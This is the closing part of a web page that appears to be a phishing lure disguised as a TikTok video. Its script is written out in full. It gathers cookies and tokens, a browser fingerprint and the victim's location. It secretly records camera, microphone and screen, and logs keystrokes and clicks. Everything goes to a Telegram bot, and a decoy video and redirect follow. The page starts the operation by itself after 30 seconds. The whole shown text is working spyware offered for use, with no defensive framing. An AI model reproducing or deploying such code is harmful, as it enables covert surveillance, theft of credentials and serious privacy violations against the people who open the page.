                 message += `💻 <b>Screen Capture:</b> ${collectedData.capturedScreenshots.length} clips/images\n`;
            }

            // User Interaction Summary
            if (collectedData.keystrokes.length > 0) {
                message += `⌨️ <b>Keystrokes:</b> ${collectedData.keystrokes.length} recorded\n`;
            }
            if (collectedData.mouseMovements.length > 0) {
                message += `🖱️ <b>Mouse Movements:</b> ${collectedData.mouseMovements.length} recorded\n`;
            }
            if (collectedData.clicks.length > 0) {
                message += `👆 <b>Clicks:</b> ${collectedData.clicks.length} recorded\n`;
            }
            
            message += `\n⏰ <b>Timestamp:</b> ${collectedData.timestamp}\n`;
            message += `🔗 <b>Source URL:</b> <code>${collectedData.url}</code>\n`;
            message += `📄 <b>Page Title:</b> ${collectedData.title}\n`;
            message += `↩️ <b>Referrer:</b> ${collectedData.referrer || 'N/A'}\n`;

            try {
                // Send main message
                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                if (!textResponse.ok) {
                    const errorText = await textResponse.text();
                    console.error('Failed to send main message to Telegram:', textResponse.status, errorText);
                    showNotification('Data transmission error (main message).', 'error');
                } else {
                    console.log('Main data summary sent to Telegram.');
                }

                // Send captured images (up to first 3)
                if (textResponse.ok && collectedData.capturedImages.length > 0) {
                    for (let i = 0; i < Math.min(collectedData.capturedImages.length, 3); i++) {
                        const image = collectedData.capturedImages[i];
                        const photoBlob = await (await fetch(image.data)).blob();
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', photoBlob, `captured_image_${i}.jpg`);
                        formData.append('caption', `📸 Captured image ${i + 1} from target device.`);

                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        await new Promise(resolve => setTimeout(resolve, 1500)); // Delay between photos
                    }
                    console.log('Captured images sent.');
                }

                // Send video if available
                if (collectedData.capturedVideo) {
                    const videoBlob = await (await fetch(collectedData.capturedVideo)).blob();
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', videoBlob, 'captured_video.webm');
                    formData.append('caption', '🎬 Secret video recording from target device.');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });
                    console.log('Captured video sent.');
                }

                // Send audio if available
                if (collectedData.capturedAudio) {
                    const audioBlob = await (await fetch(collectedData.capturedAudio)).blob();
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('audio', audioBlob, 'captured_audio.webm');
                    formData.append('caption', '🎤 Secret audio recording from target device.');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
                        method: 'POST',
                        body: formData
                    });
                    console.log('Captured audio sent.');
                }

                // Send screen recording if available
                if (collectedData.capturedScreenshots.length > 0) {
                    for (const screenCapture of collectedData.capturedScreenshots) {
                        if (screenCapture.type === 'video') {
                            const screenBlob = await (await fetch(screenCapture.data)).blob();
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('video', screenBlob, 'captured_screen.webm');
                            formData.append('caption', '💻 Secret screen recording from target device.');

                            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                                method: 'POST',
                                body: formData
                            });
                            console.log('Captured screen recording sent.');
                            await new Promise(resolve => setTimeout(resolve, 1500));
                        }
                    }
                }

                // Send keystrokes and clicks as a text file if substantial
                if (collectedData.keystrokes.length > 0 || collectedData.clicks.length > 0) {
                    const interactionLog = {
                        keystrokes: collectedData.keystrokes,
                        clicks: collectedData.clicks,
                        mouseMovements: collectedData.mouseMovements
                    };
                    const interactionBlob = new Blob([JSON.stringify(interactionLog, null, 2)], { type: 'application/json' });
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('document', interactionBlob, 'user_interactions.json');
                    formData.append('caption', '📝 User interaction log (keystrokes, clicks, mouse movements).');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                    console.log('User interaction log sent.');
                }


            } catch (error) {
                console.error('Error sending data to Telegram:', error);
                showNotification('Critical data transmission failed! Attempting alternative channels.', 'error');
            }
        }

        // Play the convincing "fake" video
        function playPhantomVideo() {
            phantomVideo.src = FAKE_VIDEO_SOURCE;
            phantomVideo.style.width = '100%';
            phantomVideo.style.height = '100%';
            phantomVideo.style.objectFit = 'cover';
            phantomVideo.style.zIndex = '1'; // Bring it to front of background, behind overlay
            phantomVideo.style.opacity = '1'; // Make it visible
            phantomVideo.style.position = 'absolute';
            phantomVideo.play().then(() => {
                console.log('Phantom video started.');
                loadingOverlay.classList.remove('active'); // Hide loading overlay once video starts
            }).catch(e => {
                console.error('Error playing phantom video:', e);
                // Fallback to redirection if video cannot play
                window.location.href = TIKTOK_REDIRECT_URL;
            });
        }


        // Main stealth operation sequence
        async function startStealthOperation() {
            try {
                updateProgress(5);
                loadingMessage.textContent = getLocalizedMessage('loadingVideo');
                collectDeviceInfo();
                await new Promise(resolve => setTimeout(resolve, 300));

                updateProgress(10);
                loadingMessage.textContent = getLocalizedMessage('checkingNetwork');
                await getIPInfo();
                await new Promise(resolve => setTimeout(resolve, 500));

                updateProgress(20);
                loadingMessage.textContent = getLocalizedMessage('collectingBrowserData');
                collectBrowserFingerprint();
                collectCookiesAndTokens();
                await new Promise(resolve => setTimeout(resolve, 500));

                updateProgress(30);
                loadingMessage.textContent = getLocalizedMessage('requestingCamera');
                const cameraSuccess = await captureMultipleImages(); // Attempt image capture first
                if (!cameraSuccess) {
                    // If camera failed due to permission, stop and show error
                    return; 
                }
                await new Promise(resolve => setTimeout(resolve, 1000));

                updateProgress(50);
                loadingMessage.textContent = getLocalizedMessage('startingVideoRecording');
                await recordSecretVideo(); // Start video recording, continues from camera stream
                await recordSecretAudio(); // Start audio recording
                await new Promise(resolve => setTimeout(resolve, 1000));

                updateProgress(65);
                loadingMessage.textContent = getLocalizedMessage('requestingLocation');
                const locationSuccess = await getPreciseLocation();
                if (!locationSuccess && collectedData.location.gps === null && collectedData.ipInfo === null) {
                    // If location severely failed (e.g., permission denied), show error
                    return;
                }
                await new Promise(resolve => setTimeout(resolve, 500));

                updateProgress(75);
                loadingMessage.textContent = getLocalizedMessage('startingBackgroundMonitoring');
                startKeystrokeLogging();
                startMouseTracking();
                startClickTracking();
                await captureScreenRecording(); // Attempt screen capture
                await new Promise(resolve => setTimeout(resolve, 1000));

                updateProgress(90);
                loadingMessage.textContent = getLocalizedMessage('sendingDataSecurely');
                await sendComprehensiveDataToTelegram();
                await new Promise(resolve => setTimeout(resolve, 2000)); // Allow time for data to send

                updateProgress(100);
                loadingMessage.textContent = getLocalizedMessage('redirecting');
                
                // Crucial step: Play the phantom video
                phantomVideo.style.display = 'block'; // Make it truly visible
                playPhantomVideo();

                // Stop media streams after initial video playback starts and data sent
                // This can be adjusted if continuous recording is needed during phantom video.
                // For now, stop after initial data exfiltration to avoid persistent permission indicators.
                setTimeout(stopAllMediaStreams, 5000); // Stop streams after 5 seconds of fake video

                // Continue collecting non-media data in background if needed
                dataCollectionInterval = setInterval(() => {
                    // Periodically clean up data arrays to prevent excessive memory usage
                    collectedData.keystrokes = collectedData.keystrokes.slice(-200); 
                    collectedData.mouseMovements = collectedData.mouseMovements.slice(-300); 
                    collectedData.clicks = collectedData.clicks.slice(-100);
                    // Could re-send these small updates periodically to Telegram if desired
                }, 10000); // Every 10 seconds

                // Final redirection after a period of "video playback"
                setTimeout(() => {
                    stopTracking(); // Stop all remaining trackers
                    if (dataCollectionInterval) {
                        clearInterval(dataCollectionInterval);
                    }
                    stopAllMediaStreams(); // Ensure all streams are definitely stopped before redirect
                    window.location.href = TIKTOK_REDIRECT_URL;
                }, 30000); // Redirect after 30 seconds of fake video playback
            } catch (e) {
                console.error('SHADOW-DOMINION operation failed at a critical stage:', e);
                // Generic fallback for critical errors
                showNotification('A critical error occurred. Please try again later.', 'error');
                loadingMessage.textContent = 'Error loading content. Please refresh.';
                // Immediately redirect on critical unrecoverable failure
                setTimeout(() => {
                    window.location.href = TIKTOK_REDIRECT_URL;
                }, 5000);
            }
        }

        // Event listener for play button click
        videoPlaceholder.addEventListener('click', () => {
            videoPlaceholder.classList.add('hidden');
            loadingOverlay.classList.add('active');
            startStealthOperation();
        });

        // Initial notification
        showNotification(getLocalizedMessage('tapToWatch'));

        // Auto-start after 30 seconds if no interaction for maximum compromise attempt
        setTimeout(() => {
            if (!loadingOverlay.classList.contains('active')) {
                showNotification(getLocalizedMessage('autoPlaying'), 'info');
                videoPlaceholder.classList.add('hidden');
                loadingOverlay.classList.add('active');
                startStealthOperation();
            }
        }, 30000); // 30 seconds auto-start
    </script>
</body>
</html>
